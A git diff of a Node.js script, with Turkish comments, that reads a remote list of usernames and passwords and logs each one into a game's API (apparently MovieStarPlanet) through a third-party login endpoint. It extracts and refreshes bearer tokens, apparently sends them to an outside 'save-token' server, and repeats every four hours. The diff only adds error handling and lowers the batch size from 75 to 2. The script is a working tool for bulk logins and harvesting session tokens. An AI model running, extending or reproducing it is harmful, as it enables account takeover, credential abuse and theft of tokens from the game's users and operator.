@@ -1,11 +1,10 @@
-// index.js
 const fetch = require('node-fetch');
 
 const ACCOUNTS_URL = 'https://raw.githubusercontent.com/palacejs/deneme/refs/heads/main/ws2.txt';
 const TOKEN_POST_URL = 'https://msp2lol.onrender.com/save-token';
 const LOGIN_URL = 'https://msp2.pages.dev/api/tool-login?q=eu';
 
-const MAX_PARALLEL = 75;
+const MAX_PARALLEL = 2;
 const DELAY_BETWEEN_BATCHES = 5000;
 
 function delay(ms) {
@@ -48,11 +47,30 @@ async function login(username, password, countryCode) {
     const decoded = JSON.parse(Buffer.from(payload, 'base64').toString());
     const sub = decoded.sub;
 
+    // Profile fetch
     const profileRes = await fetch(`https://eu.mspapis.com/profileidentity/v1/logins/${sub}/profiles?filter=region:${countryCode}`, {
       headers: { Authorization: `Bearer ${loginData.access_token}` }
     });
-    const profiles = await profileRes.json();
-    if (!profiles.length) throw new Error('No profiles found');
+
+    if (!profileRes.ok) {
+      console.error(`❌ Profile fetch error: HTTP ${profileRes.status} for user ${username}`);
+      return null;
+    }
+
+    let profiles = [];
+    try {
+      const text = await profileRes.text();
+      profiles = JSON.parse(text);
+    } catch (err) {
+      console.error(`⚠️ profiles response is not JSON for user ${username}:`, err.message);
+      console.error('🔍 Response content:', await profileRes.text());
+      return null;
+    }
+
+    if (!profiles.length) {
+      console.error(`❌ No profiles found for user ${username}`);
+      return null;
+    }
 
     const profileId = profiles[0].id;
     const refreshParams = new URLSearchParams({
@@ -106,7 +124,10 @@ async function processAccount(line, index) {
 
 async function run() {
   const accounts = await fetchAccounts();
-  if (!accounts.length) return;
+  if (!accounts.length) {
+    console.error('⚠️ No accounts found');
+    return;
+  }
 
   for (let i = 0; i < accounts.length; i += MAX_PARALLEL) {
     const batch = accounts.slice(i, i + MAX_PARALLEL);
@@ -114,16 +135,16 @@ async function run() {
     if (i + MAX_PARALLEL < accounts.length) await delay(DELAY_BETWEEN_BATCHES);
   }
 
-  console.log("🏁 All accounts processed");
+  console.log("🏁 All accounts processed.");
 }
 
-// Döngüsel çalışması için sürekli tekrar et
+// Döngü ile sürekli 4 saatte bir çalıştırma örneği:
 async function loop() {
   while (true) {
-    console.log("🚀 Yeni çalıştırma başlatılıyor...");
+    console.log("🚀 Yeni çalışma başlıyor...");
     await run();
-    console.log("⏱ 12 saat bekleniyor...");
-    await delay(4 * 60 * 60 * 1000); // 12 saat = 43200000 ms
+    console.log("⏱ 4 saat bekleniyor...");
+    await delay(4 * 60 * 60 * 1000);
   }
 }
 
